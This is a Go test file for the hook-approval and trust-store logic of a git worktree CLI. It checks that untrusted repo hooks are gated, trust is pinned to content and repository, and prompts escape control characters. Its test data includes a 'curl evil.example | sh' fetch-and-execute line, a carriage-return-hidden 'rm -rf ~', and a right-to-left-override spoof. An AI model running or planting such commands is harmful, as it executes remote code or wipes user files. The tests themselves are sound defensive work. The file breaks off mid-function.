package cmd

import (
	"bytes"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"slices"
	"strings"
	"sync"
	"testing"

	"github.com/BurntSushi/toml"
	"github.com/spf13/cobra"
)

// withPreApprovedHooks takes the approval gate out of the picture, for tests
// about what running a hook does rather than about whether it may. It also
// isolates them from whatever a previous test left in the package-level hook
// globals.
func withPreApprovedHooks(t *testing.T) {
	t.Helper()
	savedSources, savedHooks, savedDeclared := hookSources, worktreeHooks, declaredHooks
	hookSources, worktreeHooks, declaredHooks = map[string]string{}, Hooks{}, map[string]Hooks{}
	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")
	t.Cleanup(func() {
		hookSources, worktreeHooks, declaredHooks = savedSources, savedHooks, savedDeclared
	})
}

// withConfigFileHooks makes the batch under test look like it came from the
// user's own config file — a source that still needs approving, just with a
// wider scope than a repository's.
func withConfigFileHooks(t *testing.T, event string, cmds ...string) {
	t.Helper()
	withoutTrustWhitelist(t)
	savedSources, savedHooks, savedPath := hookSources, worktreeHooks, configFilePath
	savedDeclared := declaredHooks
	hookSources = map[string]string{event: hookSourceConfigFile}
	worktreeHooks = Hooks{}
	setHooks(&worktreeHooks, event, cmds)
	declaredHooks = map[string]Hooks{hookSourceConfigFile: worktreeHooks}
	configFilePath = filepath.Join(t.TempDir(), "config.toml")
	t.Cleanup(func() {
		hookSources, worktreeHooks, configFilePath = savedSources, savedHooks, savedPath
		declaredHooks = savedDeclared
	})
}

// withoutTrustWhitelist clears the [trust] escape hatch, so a test asserting
// that something is gated is not quietly exempted by a leftover rule.
func withoutTrustWhitelist(t *testing.T) {
	t.Helper()
	savedPrefix, savedExact := trustPrefixes, trustExact
	trustPrefixes, trustExact = nil, nil
	t.Cleanup(func() { trustPrefixes, trustExact = savedPrefix, savedExact })
}

// repoWithHooks writes a .wt.toml containing the given body and points the
// package globals at it as if loadWorktreeConfig had found it. It returns the
// repo directory and the fake git-common-dir used as the trust key.
func repoWithHooks(t *testing.T, body string) (repoDir, trustKey string) {
	t.Helper()
	withoutTrustWhitelist(t)

	repoDir = t.TempDir()
	trustKey = filepath.Join(repoDir, ".git")

	savedPath, savedFound := configRepoPath, configRepoFound
	savedKey, savedKeyFn := configRepoKey, repoTrustKeyFn
	savedHooks, savedSources, savedDeclared := worktreeHooks, hookSources, declaredHooks
	repoTrustKeyFn = func() (string, error) { return trustKey, nil }
	t.Cleanup(func() {
		configRepoPath, configRepoFound = savedPath, savedFound
		configRepoKey, repoTrustKeyFn = savedKey, savedKeyFn
		worktreeHooks, hookSources = savedHooks, savedSources
		declaredHooks = savedDeclared
	})

	writeRepoConfig(t, repoDir, body)
	return repoDir, trustKey
}

// writeRepoConfig writes .wt.toml and sets the globals loadWorktreeConfig would
// have set, including the merged hooks and their source. Calling it again stands
// in for a later wt run picking up an edited file.
func writeRepoConfig(t *testing.T, repoDir, body string) {
	t.Helper()

	wtToml := filepath.Join(repoDir, ".wt.toml")
	if err := os.WriteFile(wtToml, []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	configRepoPath = wtToml
	configRepoFound = true

	// Mirror loadWorktreeConfig: the repo's hooks land in the merged set and
	// every event they supply is attributed to them, which is what the approval
	// is pinned to.
	var cfg Config
	if _, err := toml.Decode(body, &cfg); err != nil {
		t.Fatal(err)
	}
	repoHooks := cfg.Hooks
	// ...including the clone events it drops, so a .wt.toml naming post_clone
	// cannot produce a declared set — and a hash — that production never would.
	repoHooks.PreClone = nil
	repoHooks.PostClone = nil
	worktreeHooks = Hooks{}
	hookSources = map[string]string{}
	// Assigned into the map rather than over it: production keeps every layer's
	// declarations side by side, and replacing the map would drop a config-file
	// declaration an earlier helper made.
	if declaredHooks == nil {
		declaredHooks = map[string]Hooks{}
	}
	declaredHooks[hookSourceRepoConfig] = repoHooks
	for _, event := range hookEvents {
		cmds := hooksOf(repoHooks, event)
		if len(cmds) == 0 {
			continue
		}
		setHooks(&worktreeHooks, event, cmds)
		hookSources[event] = hookSourceRepoConfig
	}
	if key, err := repoTrustKeyFn(); err == nil {
		configRepoKey = key
	}
}

// withIsolatedTrustStore points the trust store at a scratch directory.
func withIsolatedTrustStore(t *testing.T) {
	t.Helper()
	t.Setenv("XDG_CONFIG_HOME", t.TempDir())
}

// withPolicy sets the hook approval policy for one test.
func withPolicy(t *testing.T, policy string) {
	t.Helper()
	saved := hooksPolicy
	hooksPolicy = policy
	t.Cleanup(func() { hooksPolicy = saved })
	t.Setenv("WT_HOOKS_POLICY", "")
	t.Setenv("WT_HOOKS_DISABLED", "")
	t.Setenv("WT_HOOKS_APPROVE_ALL", "")
}

// TestUntrustedRepoHooksDoNotRun is the regression test for #129: a committed
// .wt.toml must not be able to run commands just because someone cloned the repo
// and ran wt in it.
func TestUntrustedRepoHooksDoNotRun(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"touch pwned\"]\n")

	marker := filepath.Join(repoDir, "pwned")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatalf("runHooks() returned error: %v", err)
	}

	if _, err := os.Stat(marker); err == nil {
		t.Fatal("untrusted repo hook ran; it must be skipped until approved")
	}
}

// TestUntrustedRepoPreHookDoesNotAbort: declining a hook is not an error the
// user should have to work around. The operation continues without it.
func TestUntrustedRepoPreHookDoesNotAbort(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoWithHooks(t, "[hooks]\npre_create = [\"false\"]\n")

	if err := runHooks("pre_create", []string{"false"}, map[string]string{}); err != nil {
		t.Fatalf("skipping an unapproved pre-hook must not abort the operation, got: %v", err)
	}
}

func TestTrustedRepoHooksRun(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	// The command has to be the one the .wt.toml declares, and reach runHooks the
	// way every caller does — via getHooks. An approval covers the commands it
	// was hashed over, so a test handing runHooks some other batch would be
	// testing a path no caller takes and that approveHooks now refuses anyway.
	marker := filepath.Join(t.TempDir(), "ok")
	repoWithHooks(t, fmt.Sprintf("[hooks]\npost_create = [%q]\n", "touch "+filepath.ToSlash(marker)))

	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	if err := runHooks("post_create", getHooks("post_create"), map[string]string{}); err != nil {
		t.Fatalf("runHooks() returned error: %v", err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("trusted repo hook did not run")
	}
}

// TestTrustIsInvalidatedByEdit: approval is pinned to the file's contents, so a
// later commit adding a hook has to be approved again.
func TestTrustIsInvalidatedByEdit(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")

	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	// Someone pulls, and .wt.toml now asks for something else.
	marker := filepath.Join(repoDir, "pwned")
	writeRepoConfig(t, repoDir, "[hooks]\npost_create = ['touch "+marker+"']\n")

	if trust, err := hookSetTrust(hookSourceRepoConfig); err != nil {
		t.Fatal(err)
	} else if trust.trusted {
		t.Fatal("trust survived an edit to .wt.toml")
	}

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("hook ran after .wt.toml changed; approval must not carry over")
	}
}

// TestTrustDoesNotTransferBetweenRepos: an identical .wt.toml elsewhere is not
// covered. "make setup" is only as safe as the Makefile next to it.
func TestTrustDoesNotTransferBetweenRepos(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	body := "[hooks]\npost_create = [\"make setup\"]\n"
	repoWithHooks(t, body)
	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}
	approvedSHA := trust.sha

	// A second repository shipping byte-identical config.
	repoWithHooks(t, body)
	other, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if other.sha != approvedSHA {
		t.Fatalf("test setup: expected identical hashes, got %s and %s", approvedSHA, other.sha)
	}
	if other.trusted {
		t.Fatal("approval leaked to a different repository with identical .wt.toml")
	}
}

// TestTrustKeyRejectsClaimedCommonDir: a directory can put anything in a `.git`
// file, including the git dir of a repository you trust. The trust key must not
// take that claim at face value, or an identical .wt.toml would inherit the
// approval and run its commands in the claimant's working tree.
func TestTrustKeyRejectsClaimedCommonDir(t *testing.T) {
	realRepo := t.TempDir()
	gitInit(t, realRepo)

	// A directory that is not a worktree of realRepo, but says it is.
	impostor := t.TempDir()
	gitDirFile := "gitdir: " + filepath.Join(realRepo, ".git") + "\n"
	if err := os.WriteFile(filepath.Join(impostor, ".git"), []byte(gitDirFile), 0o644); err != nil {
		t.Fatal(err)
	}

	t.Chdir(realRepo)
	realKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if realKey != canonicalPath(filepath.Join(realRepo, ".git")) {
		t.Errorf("trust key for a real checkout = %q, want its common git dir", realKey)
	}

	t.Chdir(impostor)
	impostorKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if impostorKey == realKey {
		t.Fatal("a .git file claiming another repository's git dir inherited its trust key")
	}
	if impostorKey != canonicalPath(impostor) {
		t.Errorf("impostor trust key = %q, want its own path %q", impostorKey, canonicalPath(impostor))
	}
}

// TestTrustKeyIsSharedByWorktrees: the flip side — a genuine linked worktree
// must keep the main checkout's key, or every wt create would re-prompt.
func TestTrustKeyIsSharedByWorktrees(t *testing.T) {
	repo := t.TempDir()
	gitInit(t, repo)

	t.Chdir(repo)
	mainKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}

	linked := filepath.Join(t.TempDir(), "wt")
	runGit(t, repo, "worktree", "add", "-b", "feat/x", linked)

	t.Chdir(linked)
	linkedKey, err := defaultRepoTrustKey()
	if err != nil {
		t.Fatal(err)
	}
	if linkedKey != mainKey {
		t.Errorf("linked worktree key = %q, want the main checkout's %q", linkedKey, mainKey)
	}
}

func gitInit(t *testing.T, dir string) {
	t.Helper()
	runGit(t, dir, "init", "-q")
	runGit(t, dir, "config", "user.email", "test@example.com")
	runGit(t, dir, "config", "user.name", "test")
	if err := os.WriteFile(filepath.Join(dir, "README"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	runGit(t, dir, "add", "README")
	runGit(t, dir, "commit", "-qm", "initial")
}

func runGit(t *testing.T, dir string, args ...string) {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	if out, err := cmd.CombinedOutput(); err != nil {
		t.Fatalf("git %v: %v\n%s", args, err, out)
	}
}

func TestUntrustRevokes(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")

	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	if err := runUntrust(nil); err != nil {
		t.Fatal(err)
	}

	after, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if after.trusted {
		t.Fatal("wt untrust did not revoke the approval")
	}
}

// TestConfigFileHooksNeedApprovalToo is the inversion: wt used to run anything
// not labelled "repo config" unprompted, which made the permissive answer the
// one a source got by omission. Nothing runs unapproved now, whoever wrote it.
func TestConfigFileHooksNeedApprovalToo(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	withConfigFileHooks(t, "post_create", "touch "+marker)

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a hook from the user's config file ran before it was approved")
	}
}

// TestApprovedConfigFileHooksRunEverywhere: the approval for the user's own
// config file is not pinned to a repository, so giving it once is the whole
// cost. Pinning it per repo would make wt ask again in every checkout, which is
// how a security prompt turns into something people learn to click through.
func TestApprovedConfigFileHooksRunEverywhere(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	withConfigFileHooks(t, "post_create", "touch "+marker)

	trust, err := hookSetTrust(hookSourceConfigFile)
	if err != nil {
		t.Fatal(err)
	}
	if trust.scope != trustScopeUser {
		t.Fatalf("config file hooks scoped to %q, want %q", trust.scope, trustScopeUser)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("an approved hook from the user's config file did not run")
	}
}

// TestPromptAllGatesApprovedHooksToo answers the "ask me every time" case:
// under prompt-all an existing approval decides nothing, so with no terminal
// the hooks are skipped.
func TestPromptAllGatesApprovedHooksToo(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptAll)

	dir := t.TempDir()
	marker := filepath.Join(dir, "ran")
	withConfigFileHooks(t, "post_create", "touch "+marker)

	trust, err := hookSetTrust(hookSourceConfigFile)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("prompt-all ran an already-approved hook without asking")
	}
}

// TestApproveAllEscapeHatch: the documented opt-out for automation the user
// controls.
func TestApproveAllEscapeHatch(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")
	// Declare the command the test actually runs. A batch that does not match
	// its source drops the trust and takes the mismatch path, which would leave
	// this passing for the wrong reason — approve-all is what is under test.
	marker := filepath.Join(repoDir, "ran")
	writeRepoConfig(t, repoDir, "[hooks]\npost_create = ['touch "+marker+"']\n")
	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")

	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("WT_HOOKS_APPROVE_ALL=1 did not approve the hook")
	}
}

// TestApprovedSourceDoesNotCoverSomeOtherBatch: an approval covers the commands
// it was hashed over, and the batch reaches approveHooks separately from the
// file it was read from. Every caller passes getHooks today, so this is a guard
// against a future one that does not — a batch that is not this source's own
// must not ride in on the source's approval, and must not be silently
// remembered as it either.
func TestApprovedSourceDoesNotCoverSomeOtherBatch(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")

	// Approve what the repository actually declares.
	trust, err := hookSetTrust(hookSourceRepoConfig)
	if err != nil {
		t.Fatal(err)
	}
	if err := trustHookSet(trust); err != nil {
		t.Fatal(err)
	}

	// Then hand runHooks something else. There is no terminal here, so an
	// unapproved batch is skipped and the marker stays absent.
	marker := filepath.Join(repoDir, "smuggled")
	stderr := captureStderr(t)
	if err := runHooks("post_create", []string{"touch " + filepath.ToSlash(marker)}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("a batch the repository never declared ran on the approval of one it did")
	}
	// And the batch itself is what the user is asked about: showing the declared
	// "true" while running "touch smuggled" would be the same hole with a prompt
	// in front of it.
	if out := stderr(); !strings.Contains(out, "touch ") {
		t.Errorf("the batch that was about to run was not shown:\n%s", out)
	}

	// Nothing was recorded for it, so the next run asks again rather than
	// treating the smuggled batch as approved.
	after, err := loadTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if len(after.Trusted) != 1 {
		t.Errorf("the store gained a record for a batch that was never approved: %+v", after.Trusted)
	}
}

func TestEffectiveHooksPolicy(t *testing.T) {
	tests := []struct {
		name       string
		configured string
		envPolicy  string
		envDisable string
		want       string
	}{
		{name: "defaults to prompt-untrusted", want: hookPolicyPromptUntrusted},
		{name: "config file value", configured: hookPolicyPromptAll, want: hookPolicyPromptAll},
		{name: "env overrides config", configured: hookPolicyPromptAll, envPolicy: hookPolicyTrustedOnly, want: hookPolicyTrustedOnly},
		{name: "WT_HOOKS_DISABLED wins", configured: hookPolicyPromptAll, envDisable: "1", want: hookPolicyOff},
		{name: "unknown value falls back to the safe default", configured: "yolo", want: hookPolicyPromptUntrusted},
		{name: "typo in env does not weaken a stricter config", configured: hookPolicyPromptAll, envPolicy: "promt-all", want: hookPolicyPromptAll},
		{name: "typo in env with no config falls back to the default", envPolicy: "promt-all", want: hookPolicyPromptUntrusted},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			withPolicy(t, tt.configured)
			t.Setenv("WT_HOOKS_POLICY", tt.envPolicy)
			t.Setenv("WT_HOOKS_DISABLED", tt.envDisable)

			if got := effectiveHooksPolicy(); got != tt.want {
				t.Errorf("effectiveHooksPolicy() = %q, want %q", got, tt.want)
			}
		})
	}
}

// TestLoadWorktreeConfigTracksHookSources covers the load-time half: hooks have
// to arrive at runHooks knowing which layer supplied them, and a repository must
// not be able to set the policy that governs its own hooks.
func TestLoadWorktreeConfigTracksHookSources(t *testing.T) {
	savedFlag, savedFn := configFlag, gitRepoRootFn
	savedHooks, savedSources, savedPolicy := worktreeHooks, hookSources, hooksPolicy
	t.Cleanup(func() {
		configFlag, gitRepoRootFn = savedFlag, savedFn
		worktreeHooks, hookSources, hooksPolicy = savedHooks, savedSources, savedPolicy
		loadWorktreeConfig()
	})

	tmpDir := t.TempDir()
	globalCfg := filepath.Join(tmpDir, "global.toml")
	if err := os.WriteFile(globalCfg, []byte(`hooks_policy = "prompt-all"

[hooks]
pre_create = ["mine"]
post_create = ["mine too"]
`), 0o644); err != nil {
		t.Fatal(err)
	}

	repoDir := filepath.Join(tmpDir, "repo")
	if err := os.MkdirAll(repoDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repoDir, ".wt.toml"), []byte(`hooks_policy = "off"

[hooks]
post_create = ["theirs"]
post_clone = ["theirs too"]
`), 0o644); err != nil {
		t.Fatal(err)
	}

	configFlag = ""
	t.Setenv("WT_CONFIG", globalCfg)
	gitRepoRootFn = func() (string, error) { return repoDir, nil }

	loadWorktreeConfig()

	if got := hookSources["pre_create"]; got != hookSourceConfigFile {
		t.Errorf("hookSources[pre_create] = %q, want %q", got, hookSourceConfigFile)
	}
	if got := hookSources["post_create"]; got != hookSourceRepoConfig {
		t.Errorf("hookSources[post_create] = %q, want %q", got, hookSourceRepoConfig)
	}
	if got := hooksPolicy; got != hookPolicyPromptAll {
		t.Errorf("hooksPolicy = %q, want %q — .wt.toml must not set the policy", got, hookPolicyPromptAll)
	}

	// pre_clone/post_clone are not merged from repo config, so nothing there is
	// repo-sourced either.
	if got := hookSources["post_clone"]; got != "" {
		t.Errorf("hookSources[post_clone] = %q, want unset", got)
	}
	if len(worktreeHooks.PostClone) != 0 {
		t.Errorf("worktreeHooks.PostClone = %v, want empty", worktreeHooks.PostClone)
	}

	// What each source *asked for*, not what survived the merge: an approval is
	// pinned to this list, so the config file keeps the post_create the repo
	// shadowed. Reading the merged result instead would make the identity of the
	// user's own hooks depend on which repository they were standing in.
	repoEntries := hookSetEntries(hookSourceRepoConfig)
	if len(repoEntries) != 1 || repoEntries[0].Event != "post_create" || repoEntries[0].Cmd != "theirs" {
		t.Errorf("hookSetEntries(repo) = %+v, want the single post_create command", repoEntries)
	}
	userEntries := hookSetEntries(hookSourceConfigFile)
	wantUser := []hookEntry{{Event: "pre_create", Cmd: "mine"}, {Event: "post_create", Cmd: "mine too"}}
	if !slices.Equal(userEntries, wantUser) {
		t.Errorf("hookSetEntries(config file) = %+v, want everything the file declared: %+v", userEntries, wantUser)
	}

	// The same file has to hash the same whether or not a repo shadowed one of
	// its events — that is the property the merged reading broke.
	shadowed := hookSetHash(hookSourceConfigFile, userEntries)
	withRepo := declaredHooks[hookSourceRepoConfig]
	declaredHooks[hookSourceRepoConfig] = Hooks{}
	alone := hookSetHash(hookSourceConfigFile, hookSetEntries(hookSourceConfigFile))
	declaredHooks[hookSourceRepoConfig] = withRepo
	if alone != shadowed {
		t.Errorf("config file hashed differently with a repo present (%q) and without (%q)", shadowed, alone)
	}
	if got := loadedHookSources(); len(got) != 2 {
		t.Errorf("loadedHookSources() = %v, want both layers", got)
	}
}

func TestTrustStoreRoundTrip(t *testing.T) {
	withIsolatedTrustStore(t)

	store, err := loadTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if len(store.Trusted) != 0 {
		t.Fatalf("fresh trust store has %d records, want 0", len(store.Trusted))
	}

	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "now"})
	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "bbb", ApprovedAt: "now"})
	store.add(trustRecord{Scope: "/repo/.git", File: "/repo/.wt.toml", SHA256: "aaa", ApprovedAt: "later"})
	if len(store.Trusted) != 2 {
		t.Fatalf("add() kept %d records, want 2 (same scope+hash should replace)", len(store.Trusted))
	}

	if err := saveTrustStore(store); err != nil {
		t.Fatal(err)
	}

	// 0600: the record of what the user agreed to execute. Windows has no
	// Unix permission bits — os.Chmod there only toggles the read-only flag —
	// so the assertion is meaningless on that platform.
	if runtime.GOOS != "windows" {
		info, err := os.Stat(trustFilePath())
		if err != nil {
			t.Fatal(err)
		}
		if perm := info.Mode().Perm(); perm != 0o600 {
			t.Errorf("trust store mode = %o, want 600", perm)
		}
	}

	reloaded, err := loadTrustStore()
	if err != nil {
		t.Fatal(err)
	}
	if !reloaded.isTrusted("/repo/.git", "aaa") || !reloaded.isTrusted("/repo/.git", "bbb") {
		t.Error("records did not survive a save/load round trip")
	}
	if reloaded.isTrusted("/elsewhere/.git", "aaa") {
		t.Error("isTrusted() matched on hash alone; scope must match too")
	}
	if reloaded.isTrusted("/repo/.git", "ccc") {
		t.Error("isTrusted() matched on scope alone; hash must match too")
	}

	if removed := reloaded.remove("/repo/.git"); removed != 2 {
		t.Errorf("remove() = %d, want 2", removed)
	}
}

// TestMalformedTrustStoreIsAnError: silently reading a broken store as "nothing
// is trusted" is safe, but leaves the user re-approving forever with no clue.
func TestMalformedTrustStoreIsAnError(t *testing.T) {
	withIsolatedTrustStore(t)
	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("this is not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}

	if _, err := loadTrustStore(); err == nil {
		t.Fatal("loadTrustStore() accepted a malformed store")
	}
}

// TestApprovalRequestShowsWholeSet: approving from the prompt persists an
// answer for everything the source contributes, so the prompt has to show all
// of it — otherwise a harmless post_create buys silent consent for a pre_remove
// the user never saw.
func TestApprovalRequestShowsWholeSet(t *testing.T) {
	savedHooks, savedSources, savedDeclared := worktreeHooks, hookSources, declaredHooks
	worktreeHooks = Hooks{
		PostCreate: []string{"echo hello"},
		PreRemove:  []string{"curl evil.example | sh"},
	}
	hookSources = map[string]string{
		"post_create": hookSourceRepoConfig,
		"pre_remove":  hookSourceRepoConfig,
	}
	declaredHooks = map[string]Hooks{hookSourceRepoConfig: worktreeHooks}
	t.Cleanup(func() {
		worktreeHooks, hookSources, declaredHooks = savedHooks, savedSources, savedDeclared
	})

	var buf bytes.Buffer
	entries := hookSetEntries(hookSourceRepoConfig)
	printHookApprovalRequest(&buf, entries, "post_create", hookTrust{file: ".wt.toml"})
	out := buf.String()

	// The same set is what the approval is keyed on, so a batch that showed less
	// than it approved would also hash less than it approved.
	if got := hookSetHash(hookSourceRepoConfig, entries); got != hookSetHash(hookSourceRepoConfig, hookSetEntries(hookSourceRepoConfig)) || got == "" {
		t.Errorf("hookSetHash() not stable over the displayed set, got %q", got)
	}

	for _, want := range []string{"→ [post_create] echo hello", "[pre_remove] curl evil.example | sh"} {
		if !strings.Contains(out, want) {
			t.Errorf("approval request missing %q, got:\n%s", want, out)
		}
	}
	if strings.Contains(out, "→ [pre_remove]") {
		t.Errorf("only the firing event should be marked, got:\n%s", out)
	}
}

// TestApproveAllSurvivesABrokenTrustStore: an unattended run that opted into
// WT_HOOKS_APPROVE_ALL should not start skipping hooks because the store it was
// told to bypass has been corrupted.
func TestApproveAllSurvivesABrokenTrustStore(t *testing.T) {
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)
	repoDir, _ := repoWithHooks(t, "[hooks]\npost_create = [\"true\"]\n")

	path := trustFilePath()
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(path, []byte("not toml ]["), 0o600); err != nil {
		t.Fatal(err)
	}
	t.Setenv("WT_HOOKS_APPROVE_ALL", "1")

	marker := filepath.Join(repoDir, "ran")
	if err := runHooks("post_create", []string{"touch " + marker}, map[string]string{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(marker); err != nil {
		t.Fatal("WT_HOOKS_APPROVE_ALL=1 did not survive an unreadable trust store")
	}
}

// TestDisplayTextEscapesControlCharacters: the prompt is where the user
// decides whether to run these commands, so the commands must not be able to
// redraw it.
func TestDisplayTextEscapesControlCharacters(t *testing.T) {
	tests := []struct {
		in   string
		want string
	}{
		{in: "npm install && echo 'ok'", want: "npm install && echo 'ok'"},
		{in: "echo hi\x1b[2Jcurl evil.example | sh", want: `echo hi\x1b[2Jcurl evil.example | sh`},
		{in: "safe\rrm -rf ~", want: `safe\rrm -rf ~`},
		{in: "echo \u202egnahtemos", want: `echo \u202egnahtemos`},
		{in: "a\tb", want: `a\tb`},
		{in: "échò ✓", want: "échò ✓"},
	}

	for _, tt := range tests {
		if got := displayText(tt.in); got != tt.want {
			t.Errorf("displayText(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}
}

// TestOffersTrust: the "remember this" option is only honest where taking it
// actually stops the next prompt.
func TestOffersTrust(t *testing.T) {
	repo := hookTrust{scope: "/repo/.git", sha: "abc"}
	user := hookTrust{scope: trustScopeUser, sha: "abc"}
	// An unrecognised source: nowhere to file the answer, so nothing to offer.
	unscoped := hookTrust{}

	tests := []struct {
		name   string
		trust  hookTrust
		policy string
		want   bool
	}{
		{name: "repo hooks", trust: repo, policy: hookPolicyPromptUntrusted, want: true},
		{name: "the user's own hooks are trustable too now", trust: user, policy: hookPolicyPromptUntrusted, want: true},
		{name: "prompt-all asks again regardless", trust: repo, policy: hookPolicyPromptAll, want: false},
		{name: "nothing to record", trust: unscoped, policy: hookPolicyPromptUntrusted, want: false},
	}
	for _, tt := range tests {
		if got := offersTrust(tt.trust, tt.policy); got != tt.want {
			t.Errorf("%s: offersTrust(%+v, %q) = %v, want %v", tt.name, tt.trust, tt.policy, got, tt.want)
		}
	}
}

// TestApprovalRequestOmitsRestNoteWhenThereIsNoRest: the note only makes sense
// when the approval reaches beyond what is about to run.
func TestApprovalRequestOmitsRestNoteWhenThereIsNoRest(t *testing.T) {
	const note = "covers the rest"

	var repoOneEvent bytes.Buffer
	printHookApprovalRequest(&repoOneEvent, []hookEntry{
		{Event: "post_create", Cmd: "a"},
		{Event: "post_create", Cmd: "b"},
	}, "post_create", hookTrust{file: ".wt.toml"})
	if strings.Contains(repoOneEvent.String(), note) {
		t.Errorf("note shown for a single-event file, got:\n%s", repoOneEvent.String())
	}

	var userHooks bytes.Buffer
	printHookApprovalRequest(&userHooks, []hookEntry{
		{Event: "post_create", Cmd: "a"},
		{Event: "pre_remove", Cmd: "b"},
	}, "post_create", hookTrust{})
	if strings.Contains(userHooks.String(), note) {
		t.Errorf("note shown where there is no file to name, got:\n%s", userHooks.String())
	}
}

// TestTrustCommandsRejectArguments: 'wt trust typo' must not quietly approve the
// repository the user is standing in.
func TestTrustCommandsRejectArguments(t *testing.T) {
	for _, c := range []*cobra.Command{trustCmd, untrustCmd} {
		if err := c.Args(c, []string{"unexpected"}); err == nil {
			t.Errorf("wt %s accepted an unexpected argument", c.Name())
		}
	}
}

// TestTrustSurvivesADeletedWorkingDirectory: wt remove fires post_remove hooks
// after git has deleted the worktree, so the trust key cannot be resolved by
// asking git from the current directory at that point.
func TestTrustSurvivesADeletedWorkingDirectory(t *testing.T) {
	if runtime.GOOS == "windows" {
		// Windows will not delete a directory that is any process's current
		// directory, so the situation this test recreates cannot be staged
		// there. The code path it covers is shared across platforms.
		t.Skip("cannot remove the current working directory on Windows")
	}
	withIsolatedTrustStore(t)
	withPolicy(t, hookPolicyPromptUntrusted)

	repoDir := t.TempDir()
	gitInit(t, repoDir)
	t.Chdir(repoDir)

	savedPath, savedFound, savedKey := configRepoPath, configRepoFound, configRepoKey
	savedHooks, savedSources := worktreeHooks, hookSources
	savedDeclared := declaredHooks
	withoutTrustWhitelist(t)
	t.Cleanup(func() {
		configRepoPath, configRepoFound, configRepoKey = savedPath, savedFound, savedKey
		worktreeHooks, hookSources = savedHooks, savedSources
		declaredHooks = savedDeclared
	})
